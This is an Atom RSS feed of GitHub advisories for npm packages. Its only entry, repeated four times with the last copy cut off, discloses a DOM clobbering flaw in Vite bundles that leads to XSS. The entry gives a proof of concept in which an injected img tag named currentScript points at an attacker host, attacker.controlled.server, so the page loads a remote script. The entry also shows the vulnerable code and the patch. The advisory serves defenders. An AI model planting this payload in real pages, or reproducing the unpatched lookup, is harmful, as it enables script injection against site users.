<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2024-09-17T21:01:15.137Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[vite] Vite DOM Clobbering gadget found in vite bundled scripts that leads to XSS]]></title>
        <id>https://github.com/advisories/GHSA-64vr-g452-qvp3</id>
        <link href="https://github.com/advisories/GHSA-64vr-g452-qvp3"/>
        <updated>2024-09-17T19:28:03.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>We discovered a DOM Clobbering vulnerability in Vite when building scripts to <code>cjs</code>/<code>iife</code>/<code>umd</code> output format. The DOM Clobbering gadget in the module can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an img tag with an unsanitized name attribute) are present.</p>
<p>Note that, we have identified similar security issues in Webpack: <a href="https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986">https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986</a></p>
<h3 id="details">Details</h3>
<p><strong>Backgrounds</strong></p>
<p>DOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:</p>
<p>[1] <a href="https://scnps.co/papers/sp23_domclob.pdf">https://scnps.co/papers/sp23_domclob.pdf</a>
[2] <a href="https://research.securitum.com/xss-in-amp4email-dom-clobbering/">https://research.securitum.com/xss-in-amp4email-dom-clobbering/</a></p>
<p><strong>Gadgets found in Vite</strong></p>
<p>We have identified a DOM Clobbering vulnerability in Vite bundled scripts, particularly when the scripts dynamically import other scripts from the assets folder and the developer sets the build output format to <code>cjs</code>, <code>iife</code>, or <code>umd</code>. In such cases, Vite replaces relative paths starting with <code>__VITE_ASSET__</code> using the URL retrieved from <code>document.currentScript</code>.</p>
<p>However, this implementation is vulnerable to a DOM Clobbering attack. The <code>document.currentScript</code> lookup can be shadowed by an attacker via the browser's named DOM tree element access mechanism. This manipulation allows an attacker to replace the intended script element with a malicious HTML element. When this happens, the src attribute of the attacker-controlled element is used as the URL for importing scripts, potentially leading to the dynamic loading of scripts from an attacker-controlled server.</p>
<pre><code>const relativeUrlMechanisms = {
  amd: (relativePath) =&gt; {
    if (relativePath[0] !== ".") relativePath = "./" + relativePath;
    return getResolveUrl(
      `require.toUrl('${escapeId(relativePath)}'), document.baseURI`
    );
  },
  cjs: (relativePath) =&gt; `(typeof document === 'undefined' ? ${getFileUrlFromRelativePath(
    relativePath
  )} : ${getRelativeUrlFromDocument(relativePath)})`,
  es: (relativePath) =&gt; getResolveUrl(
    `'${escapeId(partialEncodeURIPath(relativePath))}', import.meta.url`
  ),
  iife: (relativePath) =&gt; getRelativeUrlFromDocument(relativePath),
  // NOTE: make sure rollup generate `module` params
  system: (relativePath) =&gt; getResolveUrl(
    `'${escapeId(partialEncodeURIPath(relativePath))}', module.meta.url`
  ),
  umd: (relativePath) =&gt; `(typeof document === 'undefined' &amp;&amp; typeof location === 'undefined' ? ${getFileUrlFromRelativePath(
    relativePath
  )} : ${getRelativeUrlFromDocument(relativePath, true)})`
};
</code></pre>
<h3 id="poc">PoC</h3>
<p>Considering a website that contains the following <code>main.js</code> script, the devloper decides to use the Vite to bundle up the program with the following configuration. </p>
<pre><code>// main.js
import extraURL from './extra.js?url'
var s = document.createElement('script')
s.src = extraURL
document.head.append(s)
</code></pre>
<pre><code>// extra.js
export default "https://myserver/justAnOther.js"
</code></pre>
<pre><code>// vite.config.js
import { defineConfig } from 'vite'

export default defineConfig({
  build: {
    assetsInlineLimit: 0, // To avoid inline assets for PoC
    rollupOptions: {
      output: {
        format: "cjs"
      },
    },
  },
  base: "./",
});
</code></pre>
<p>After running the build command, the developer will get following bundle as the output.</p>
<pre><code>// dist/index-DDmIg9VD.js
"use strict";const t=""+(typeof document&gt;"u"?require("url").pathToFileURL(__dirname+"/extra-BLVEx9Lb.js").href:new URL("extra-BLVEx9Lb.js",document.currentScript&amp;&amp;document.currentScript.src||document.baseURI).href);var e=document.createElement("script");e.src=t;document.head.append(e);
</code></pre>
<p>Adding the Vite bundled script, <code>dist/index-DDmIg9VD.js</code>, as part of the web page source code, the page could load the <code>extra.js</code> file from the attacker's domain, <code>attacker.controlled.server</code>. The attacker only needs to insert an <code>img</code> tag with the <code>name</code> attribute set to <code>currentScript</code>. This can be done through a website's feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.</p>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
  &lt;title&gt;Vite Example&lt;/title&gt;
  &lt;!-- Attacker-controlled Script-less HTML Element starts--!&gt;
  &lt;img name="currentScript" src="https://attacker.controlled.server/"&gt;&lt;/img&gt;
  &lt;!-- Attacker-controlled Script-less HTML Element ends--!&gt;
&lt;/head&gt;
&lt;script type="module" crossorigin src="/assets/index-DDmIg9VD.js"&gt;&lt;/script&gt;
&lt;body&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h3 id="impact">Impact</h3>
<p>This vulnerability can result in cross-site scripting (XSS) attacks on websites that include Vite-bundled files (configured with an output format of <code>cjs</code>, <code>iife</code>, or <code>umd</code>) and allow users to inject certain scriptless HTML tags without properly sanitizing the name or id attributes.</p>
<h3 id="patch">Patch</h3>
<pre><code>// https://github.com/vitejs/vite/blob/main/packages/vite/src/node/build.ts#L1296
const getRelativeUrlFromDocument = (relativePath: string, umd = false) =&gt;
  getResolveUrl(
    `'${escapeId(partialEncodeURIPath(relativePath))}', ${
      umd ? `typeof document === 'undefined' ? location.href : ` : ''
    }document.currentScript &amp;&amp; document.currentScript.tagName.toUpperCase() === 'SCRIPT' &amp;&amp; document.currentScript.src || document.baseURI`,
  )
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vitejs/vite/security/advisories/GHSA-64vr-g452-qvp3">https://github.com/vitejs/vite/security/advisories/GHSA-64vr-g452-qvp3</a></li>
<li><a href="https://github.com/vitejs/vite/commit/179b17773cf35c73ddb041f9e6c703fd9f3126af">https://github.com/vitejs/vite/commit/179b17773cf35c73ddb041f9e6c703fd9f3126af</a></li>
<li><a href="https://github.com/vitejs/vite/commit/2691bb3ff6b073b41fb9046909e1e03a74e36675">https://github.com/vitejs/vite/commit/2691bb3ff6b073b41fb9046909e1e03a74e36675</a></li>
<li><a href="https://github.com/vitejs/vite/commit/2ddd8541ec3b2d2e5b698749e0f2362ef28056bd">https://github.com/vitejs/vite/commit/2ddd8541ec3b2d2e5b698749e0f2362ef28056bd</a></li>
<li><a href="https://github.com/vitejs/vite/commit/e8127166979e7ace6eeaa2c3b733c8994caa31f3">https://github.com/vitejs/vite/commit/e8127166979e7ace6eeaa2c3b733c8994caa31f3</a></li>
<li><a href="https://github.com/vitejs/vite/commit/ebb94c5b3bf41950f45562595adec117a4d0ba5e">https://github.com/vitejs/vite/commit/ebb94c5b3bf41950f45562595adec117a4d0ba5e</a></li>
<li><a href="https://github.com/advisories/GHSA-64vr-g452-qvp3">https://github.com/advisories/GHSA-64vr-g452-qvp3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-64vr-g452-qvp3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-17T19:28:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vite] Vite DOM Clobbering gadget found in vite bundled scripts that leads to XSS]]></title>
        <id>https://github.com/advisories/GHSA-64vr-g452-qvp3</id>
        <link href="https://github.com/advisories/GHSA-64vr-g452-qvp3"/>
        <updated>2024-09-17T19:28:03.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>We discovered a DOM Clobbering vulnerability in Vite when building scripts to <code>cjs</code>/<code>iife</code>/<code>umd</code> output format. The DOM Clobbering gadget in the module can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an img tag with an unsanitized name attribute) are present.</p>
<p>Note that, we have identified similar security issues in Webpack: <a href="https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986">https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986</a></p>
<h3 id="details">Details</h3>
<p><strong>Backgrounds</strong></p>
<p>DOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:</p>
<p>[1] <a href="https://scnps.co/papers/sp23_domclob.pdf">https://scnps.co/papers/sp23_domclob.pdf</a>
[2] <a href="https://research.securitum.com/xss-in-amp4email-dom-clobbering/">https://research.securitum.com/xss-in-amp4email-dom-clobbering/</a></p>
<p><strong>Gadgets found in Vite</strong></p>
<p>We have identified a DOM Clobbering vulnerability in Vite bundled scripts, particularly when the scripts dynamically import other scripts from the assets folder and the developer sets the build output format to <code>cjs</code>, <code>iife</code>, or <code>umd</code>. In such cases, Vite replaces relative paths starting with <code>__VITE_ASSET__</code> using the URL retrieved from <code>document.currentScript</code>.</p>
<p>However, this implementation is vulnerable to a DOM Clobbering attack. The <code>document.currentScript</code> lookup can be shadowed by an attacker via the browser's named DOM tree element access mechanism. This manipulation allows an attacker to replace the intended script element with a malicious HTML element. When this happens, the src attribute of the attacker-controlled element is used as the URL for importing scripts, potentially leading to the dynamic loading of scripts from an attacker-controlled server.</p>
<pre><code>const relativeUrlMechanisms = {
  amd: (relativePath) =&gt; {
    if (relativePath[0] !== ".") relativePath = "./" + relativePath;
    return getResolveUrl(
      `require.toUrl('${escapeId(relativePath)}'), document.baseURI`
    );
  },
  cjs: (relativePath) =&gt; `(typeof document === 'undefined' ? ${getFileUrlFromRelativePath(
    relativePath
  )} : ${getRelativeUrlFromDocument(relativePath)})`,
  es: (relativePath) =&gt; getResolveUrl(
    `'${escapeId(partialEncodeURIPath(relativePath))}', import.meta.url`
  ),
  iife: (relativePath) =&gt; getRelativeUrlFromDocument(relativePath),
  // NOTE: make sure rollup generate `module` params
  system: (relativePath) =&gt; getResolveUrl(
    `'${escapeId(partialEncodeURIPath(relativePath))}', module.meta.url`
  ),
  umd: (relativePath) =&gt; `(typeof document === 'undefined' &amp;&amp; typeof location === 'undefined' ? ${getFileUrlFromRelativePath(
    relativePath
  )} : ${getRelativeUrlFromDocument(relativePath, true)})`
};
</code></pre>
<h3 id="poc">PoC</h3>
<p>Considering a website that contains the following <code>main.js</code> script, the devloper decides to use the Vite to bundle up the program with the following configuration. </p>
<pre><code>// main.js
import extraURL from './extra.js?url'
var s = document.createElement('script')
s.src = extraURL
document.head.append(s)
</code></pre>
<pre><code>// extra.js
export default "https://myserver/justAnOther.js"
</code></pre>
<pre><code>// vite.config.js
import { defineConfig } from 'vite'

export default defineConfig({
  build: {
    assetsInlineLimit: 0, // To avoid inline assets for PoC
    rollupOptions: {
      output: {
        format: "cjs"
      },
    },
  },
  base: "./",
});
</code></pre>
<p>After running the build command, the developer will get following bundle as the output.</p>
<pre><code>// dist/index-DDmIg9VD.js
"use strict";const t=""+(typeof document&gt;"u"?require("url").pathToFileURL(__dirname+"/extra-BLVEx9Lb.js").href:new URL("extra-BLVEx9Lb.js",document.currentScript&amp;&amp;document.currentScript.src||document.baseURI).href);var e=document.createElement("script");e.src=t;document.head.append(e);
</code></pre>
<p>Adding the Vite bundled script, <code>dist/index-DDmIg9VD.js</code>, as part of the web page source code, the page could load the <code>extra.js</code> file from the attacker's domain, <code>attacker.controlled.server</code>. The attacker only needs to insert an <code>img</code> tag with the <code>name</code> attribute set to <code>currentScript</code>. This can be done through a website's feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.</p>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
  &lt;title&gt;Vite Example&lt;/title&gt;
  &lt;!-- Attacker-controlled Script-less HTML Element starts--!&gt;
  &lt;img name="currentScript" src="https://attacker.controlled.server/"&gt;&lt;/img&gt;
  &lt;!-- Attacker-controlled Script-less HTML Element ends--!&gt;
&lt;/head&gt;
&lt;script type="module" crossorigin src="/assets/index-DDmIg9VD.js"&gt;&lt;/script&gt;
&lt;body&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h3 id="impact">Impact</h3>
<p>This vulnerability can result in cross-site scripting (XSS) attacks on websites that include Vite-bundled files (configured with an output format of <code>cjs</code>, <code>iife</code>, or <code>umd</code>) and allow users to inject certain scriptless HTML tags without properly sanitizing the name or id attributes.</p>
<h3 id="patch">Patch</h3>
<pre><code>// https://github.com/vitejs/vite/blob/main/packages/vite/src/node/build.ts#L1296
const getRelativeUrlFromDocument = (relativePath: string, umd = false) =&gt;
  getResolveUrl(
    `'${escapeId(partialEncodeURIPath(relativePath))}', ${
      umd ? `typeof document === 'undefined' ? location.href : ` : ''
    }document.currentScript &amp;&amp; document.currentScript.tagName.toUpperCase() === 'SCRIPT' &amp;&amp; document.currentScript.src || document.baseURI`,
  )
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vitejs/vite/security/advisories/GHSA-64vr-g452-qvp3">https://github.com/vitejs/vite/security/advisories/GHSA-64vr-g452-qvp3</a></li>
<li><a href="https://github.com/vitejs/vite/commit/179b17773cf35c73ddb041f9e6c703fd9f3126af">https://github.com/vitejs/vite/commit/179b17773cf35c73ddb041f9e6c703fd9f3126af</a></li>
<li><a href="https://github.com/vitejs/vite/commit/2691bb3ff6b073b41fb9046909e1e03a74e36675">https://github.com/vitejs/vite/commit/2691bb3ff6b073b41fb9046909e1e03a74e36675</a></li>
<li><a href="https://github.com/vitejs/vite/commit/2ddd8541ec3b2d2e5b698749e0f2362ef28056bd">https://github.com/vitejs/vite/commit/2ddd8541ec3b2d2e5b698749e0f2362ef28056bd</a></li>
<li><a href="https://github.com/vitejs/vite/commit/e8127166979e7ace6eeaa2c3b733c8994caa31f3">https://github.com/vitejs/vite/commit/e8127166979e7ace6eeaa2c3b733c8994caa31f3</a></li>
<li><a href="https://github.com/vitejs/vite/commit/ebb94c5b3bf41950f45562595adec117a4d0ba5e">https://github.com/vitejs/vite/commit/ebb94c5b3bf41950f45562595adec117a4d0ba5e</a></li>
<li><a href="https://github.com/advisories/GHSA-64vr-g452-qvp3">https://github.com/advisories/GHSA-64vr-g452-qvp3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-64vr-g452-qvp3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-17T19:28:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vite] Vite DOM Clobbering gadget found in vite bundled scripts that leads to XSS]]></title>
        <id>https://github.com/advisories/GHSA-64vr-g452-qvp3</id>
        <link href="https://github.com/advisories/GHSA-64vr-g452-qvp3"/>
        <updated>2024-09-17T19:28:03.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>We discovered a DOM Clobbering vulnerability in Vite when building scripts to <code>cjs</code>/<code>iife</code>/<code>umd</code> output format. The DOM Clobbering gadget in the module can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an img tag with an unsanitized name attribute) are present.</p>
<p>Note that, we have identified similar security issues in Webpack: <a href="https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986">https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986</a></p>
<h3 id="details">Details</h3>
<p><strong>Backgrounds</strong></p>
<p>DOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:</p>
<p>[1] <a href="https://scnps.co/papers/sp23_domclob.pdf">https://scnps.co/papers/sp23_domclob.pdf</a>
[2] <a href="https://research.securitum.com/xss-in-amp4email-dom-clobbering/">https://research.securitum.com/xss-in-amp4email-dom-clobbering/</a></p>
<p><strong>Gadgets found in Vite</strong></p>
<p>We have identified a DOM Clobbering vulnerability in Vite bundled scripts, particularly when the scripts dynamically import other scripts from the assets folder and the developer sets the build output format to <code>cjs</code>, <code>iife</code>, or <code>umd</code>. In such cases, Vite replaces relative paths starting with <code>__VITE_ASSET__</code> using the URL retrieved from <code>document.currentScript</code>.</p>
<p>However, this implementation is vulnerable to a DOM Clobbering attack. The <code>document.currentScript</code> lookup can be shadowed by an attacker via the browser's named DOM tree element access mechanism. This manipulation allows an attacker to replace the intended script element with a malicious HTML element. When this happens, the src attribute of the attacker-controlled element is used as the URL for importing scripts, potentially leading to the dynamic loading of scripts from an attacker-controlled server.</p>
<pre><code>const relativeUrlMechanisms = {
  amd: (relativePath) =&gt; {
    if (relativePath[0] !== ".") relativePath = "./" + relativePath;
    return getResolveUrl(
      `require.toUrl('${escapeId(relativePath)}'), document.baseURI`
    );
  },
  cjs: (relativePath) =&gt; `(typeof document === 'undefined' ? ${getFileUrlFromRelativePath(
    relativePath
  )} : ${getRelativeUrlFromDocument(relativePath)})`,
  es: (relativePath) =&gt; getResolveUrl(
    `'${escapeId(partialEncodeURIPath(relativePath))}', import.meta.url`
  ),
  iife: (relativePath) =&gt; getRelativeUrlFromDocument(relativePath),
  // NOTE: make sure rollup generate `module` params
  system: (relativePath) =&gt; getResolveUrl(
    `'${escapeId(partialEncodeURIPath(relativePath))}', module.meta.url`
  ),
  umd: (relativePath) =&gt; `(typeof document === 'undefined' &amp;&amp; typeof location === 'undefined' ? ${getFileUrlFromRelativePath(
    relativePath
  )} : ${getRelativeUrlFromDocument(relativePath, true)})`
};
</code></pre>
<h3 id="poc">PoC</h3>
<p>Considering a website that contains the following <code>main.js</code> script, the devloper decides to use the Vite to bundle up the program with the following configuration. </p>
<pre><code>// main.js
import extraURL from './extra.js?url'
var s = document.createElement('script')
s.src = extraURL
document.head.append(s)
</code></pre>
<pre><code>// extra.js
export default "https://myserver/justAnOther.js"
</code></pre>
<pre><code>// vite.config.js
import { defineConfig } from 'vite'

export default defineConfig({
  build: {
    assetsInlineLimit: 0, // To avoid inline assets for PoC
    rollupOptions: {
      output: {
        format: "cjs"
      },
    },
  },
  base: "./",
});
</code></pre>
<p>After running the build command, the developer will get following bundle as the output.</p>
<pre><code>// dist/index-DDmIg9VD.js
"use strict";const t=""+(typeof document&gt;"u"?require("url").pathToFileURL(__dirname+"/extra-BLVEx9Lb.js").href:new URL("extra-BLVEx9Lb.js",document.currentScript&amp;&amp;document.currentScript.src||document.baseURI).href);var e=document.createElement("script");e.src=t;document.head.append(e);
</code></pre>
<p>Adding the Vite bundled script, <code>dist/index-DDmIg9VD.js</code>, as part of the web page source code, the page could load the <code>extra.js</code> file from the attacker's domain, <code>attacker.controlled.server</code>. The attacker only needs to insert an <code>img</code> tag with the <code>name</code> attribute set to <code>currentScript</code>. This can be done through a website's feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.</p>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
  &lt;title&gt;Vite Example&lt;/title&gt;
  &lt;!-- Attacker-controlled Script-less HTML Element starts--!&gt;
  &lt;img name="currentScript" src="https://attacker.controlled.server/"&gt;&lt;/img&gt;
  &lt;!-- Attacker-controlled Script-less HTML Element ends--!&gt;
&lt;/head&gt;
&lt;script type="module" crossorigin src="/assets/index-DDmIg9VD.js"&gt;&lt;/script&gt;
&lt;body&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h3 id="impact">Impact</h3>
<p>This vulnerability can result in cross-site scripting (XSS) attacks on websites that include Vite-bundled files (configured with an output format of <code>cjs</code>, <code>iife</code>, or <code>umd</code>) and allow users to inject certain scriptless HTML tags without properly sanitizing the name or id attributes.</p>
<h3 id="patch">Patch</h3>
<pre><code>// https://github.com/vitejs/vite/blob/main/packages/vite/src/node/build.ts#L1296
const getRelativeUrlFromDocument = (relativePath: string, umd = false) =&gt;
  getResolveUrl(
    `'${escapeId(partialEncodeURIPath(relativePath))}', ${
      umd ? `typeof document === 'undefined' ? location.href : ` : ''
    }document.currentScript &amp;&amp; document.currentScript.tagName.toUpperCase() === 'SCRIPT' &amp;&amp; document.currentScript.src || document.baseURI`,
  )
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vitejs/vite/security/advisories/GHSA-64vr-g452-qvp3">https://github.com/vitejs/vite/security/advisories/GHSA-64vr-g452-qvp3</a></li>
<li><a href="https://github.com/vitejs/vite/commit/179b17773cf35c73ddb041f9e6c703fd9f3126af">https://github.com/vitejs/vite/commit/179b17773cf35c73ddb041f9e6c703fd9f3126af</a></li>
<li><a href="https://github.com/vitejs/vite/commit/2691bb3ff6b073b41fb9046909e1e03a74e36675">https://github.com/vitejs/vite/commit/2691bb3ff6b073b41fb9046909e1e03a74e36675</a></li>
<li><a href="https://github.com/vitejs/vite/commit/2ddd8541ec3b2d2e5b698749e0f2362ef28056bd">https://github.com/vitejs/vite/commit/2ddd8541ec3b2d2e5b698749e0f2362ef28056bd</a></li>
<li><a href="https://github.com/vitejs/vite/commit/e8127166979e7ace6eeaa2c3b733c8994caa31f3">https://github.com/vitejs/vite/commit/e8127166979e7ace6eeaa2c3b733c8994caa31f3</a></li>
<li><a href="https://github.com/vitejs/vite/commit/ebb94c5b3bf41950f45562595adec117a4d0ba5e">https://github.com/vitejs/vite/commit/ebb94c5b3bf41950f45562595adec117a4d0ba5e</a></li>
<li><a href="https://github.com/advisories/GHSA-64vr-g452-qvp3">https://github.com/advisories/GHSA-64vr-g452-qvp3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-64vr-g452-qvp3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-17T19:28:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vite] Vite DOM Clobbering gadget found in vite bundled scripts that leads to XSS]]></title>
        <id>https://github.com/advisories/GHSA-64vr-g452-qvp3</id>
        <link href="https://github.com/advisories/GHSA-64vr-g452-qvp3"/>
        <updated>2024-09-17T19:28:03.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>We discovered a DOM Clobbering vulnerability in Vite when building scripts to <code>cjs</code>/<code>iife</code>/<code>umd</code> output format. The DOM Clobbering gadget in the module can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an img tag with an unsanitized name attribute) are present.</p>
<p>Note that, we have identified similar security issues in Webpack: <a href="https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986">https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986</a></p>
<h3 id="details">Details</h3>
<p><strong>Backgrounds</strong></p>
<p>DOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:</p>
<p>[1] <a href="https://scnps.co/papers/sp23_domclob.pdf">https://scnps.co/papers/sp23_domclob.pdf</a>
[2] <a href="https://research.securitum.com/xss-in-amp4email-dom-clobbering/">https://research.securitum.com/xss-in-amp4email-dom-clobbering/</a></p>
<p><strong>Gadgets found in Vite</strong></p>
<p>We have identified a DOM Clobbering vulnerability in Vite bundled scripts, particularly when the scripts dynamically import other scripts from the assets folder and the developer sets the build output format to <code>cjs</code>, <code>iife</code>, or <code>umd</code>. In such cases, Vite replaces relative paths starting with <code>__VITE_ASSET__</code> using the URL retrieved from <code>document.currentScript</code>.</p>
<p>However, this implementation is vulnerable to a DOM Clobbering attack. The <code>document.currentScript</code> lookup can be shadowed by an attacker via the browser's named DOM tree element access mechanism. This manipulation allows an attacker to replace the intended script element with a malicious HTML element. When this happens, the src attribute of the attacker-controlled element is used as the URL for importing scripts, potentially leading to the dynamic loading of scripts from an attacker-controlled server.</p>
<pre><code>const relativeUrlMechanisms = {
  amd: (relativePath) =&gt; {
    if (relativePath[0] !== ".") relativePath = "./" + relativePath;
    return getResolveUrl(
      `require.toUrl('${escapeId(relativePath)}'), document.baseURI`
    );
  },
  cjs: (relativePath) =&gt; `(typeof document === 'undefined' ? ${getFileUrlFromRelativePath(
    relativePath
  )} : ${getRelativeUrlFromDocument(relativePath)})`,
  es: (relativePath) =&gt; getResolveUrl(
    `'${escapeId(partialEncodeURIPath(relativePath))}', import.meta.url`
  ),
  iife: (relativePath) =&gt; getRelativeUrlFromDocument(relativePath),
  // NOTE: make sure rollup generate `module` params
  system: (relativePath) =&gt; getResolveUrl(
    `'${escapeId(partialEncodeURIPath(relativePath))}', module.meta.url`
  ),
  umd: (relativePath) =&gt; `(typeof document === 'undefined' &amp;&amp; typeof location === 'undefined' ? ${getFileUrlFromRelativePath(
    relativePath
  )} : ${getRelativeUrlFromDocument(relativePath, true)})`
};
</code></pre>
<h3 id="poc">PoC</h3>
<p>Considering a website that contains the following <code>main.js</code> script, the devloper decides to use the Vite to bundle up the program with the following configuration. </p>
<pre><code>// main.js
import extraURL from './extra.js?url'
var s = document.createElement('script')
s.src = extraURL
document.head.append(s)
</code></pre>
<pre><code>// extra.js
export default "https://myserver/justAnOther.js"
</code></pre>
<pre><code>// vite.config.js
import { defineConfig } from 'vite'

export default defineConfig({
  build: {
    assetsInlineLimit: 0, // To avoid inline assets for PoC
    rollupOptions: {
      output: {
        format: "cjs"
      },
    },
  },
  base: "./",
});
</code></pre>
<p>After running the build command, the developer will get following bundle as the output.</p>
<pre><code>// dist/index-DDmIg9VD.js
"use strict";const t=""+(typeof document&gt;"u"?require("url").pathToFileURL(__dirname+"/extra-BLVEx9Lb.js").href:new URL("extra-BLVEx9Lb.js",document.currentScript&amp;&amp;document.currentScript.src||document.baseURI).href);var e=document.createElement("script");e.src=t;document.head.append(e);
</code></pre>
<p>Adding the Vite bundled script, <code>dist/index-DDmIg9VD.js</code>, as part of the web page source code, the page could load the <code>extra.js</code> file from the attacker's domain, <code>attacker.controlled.server</code>. The attacker only needs to insert an <code>img</code> tag with the <code>name</code> attribute set to <code>currentScript</code>. This can be done through a website's feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.</p>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
  &lt;title&gt;Vite Example&lt;/title&gt;
  &lt;!-- Attacker-controlled Script-less HTML Element starts--!&gt;
  &lt;img name="currentScript" src="https://attacker.controlled.server/"&gt;&lt;/img&gt;
  &lt;!-- Attacker-controlled Script-less HTML Element ends--!&gt;
&lt;/head&gt;
&lt;script type="module" crossorigin src="/assets/index-DDmIg9VD.js"&gt;&lt;/script&gt;
&lt;body&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h3 id="impact">Impact</h3>
<p>This vulnerability can result in cross-site scripting (XSS) attacks on websites that include Vite-bundled files (configured with an output format of <code>cjs</code>, <code>iife</code>, or <code>umd</code>) and allow users to inject certain scriptless HTML tags without properly sanitizing the name or id attributes.</p>
<h3 id="patch">Patch</h3>
<pre><code>// https://github.com/vitejs/vite/blob/main/packages/vite/src/node/build.ts#L1296
const getRelativeUrlFromDocument = (relativePath: string, umd = false) =&gt;
  getResolveUrl(
    `'${escapeId(partialEncodeURIPath(relativePath))}', ${
      umd ? `typeof document === 'undefined' ? location.href : ` : ''
    }document.currentScript &amp;&amp; document.currentScript.tagName.toUpperCase() === 'SCRIPT' &amp;&amp; document.currentScript.src || document.baseURI`,
  )
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vitejs/vite/security/advisories/GHSA-64vr-g452-qvp3">https://github.com/vitejs/vite/security/advisories/GHSA-64vr-g452-qvp3</a></li>
<li><a href="https://github.com/vitejs/vite/commit/179b17773cf35c73ddb041f9e6c703fd9f3126af">https://github.com/vitejs/vite/commit/179b17773cf35c73ddb041f9e6c703fd9f3126af</a></li>
<li><a href="https://github.com/vitejs/vite/commit/2691bb3ff6b073b41fb9046909e1e03a74e36675">https://github.com/vitejs/vite/commit/2691bb3ff6b073b41fb9046909e1e03a74e36675</a></li>
<li><a href="https://github.com/vitejs/vite/commit/2ddd8541ec3b2d2e5b698749e0f2362ef28056bd">https://github.com/vitejs/vite/commit/2ddd8541ec3b2d2e5b698749e0f2362ef28056bd</a></li>
<li><a href="https://github.com/vitejs/vite/commit/e8127166979e7ace6eeaa2c3b733c8994caa31f3">https://github.com/vitejs/vite/commit/e8127166979e7ace6eeaa2c3b733c8994caa31f3</a></li>
<li><a href="https://github.com/vitejs/vite/commit/ebb94c5b3bf41950f45562595adec117a4d0ba5e">https://github.com/vitejs/vite/commit/ebb94c5b3bf41950f45562595adec117a4d0ba5e</a></li>
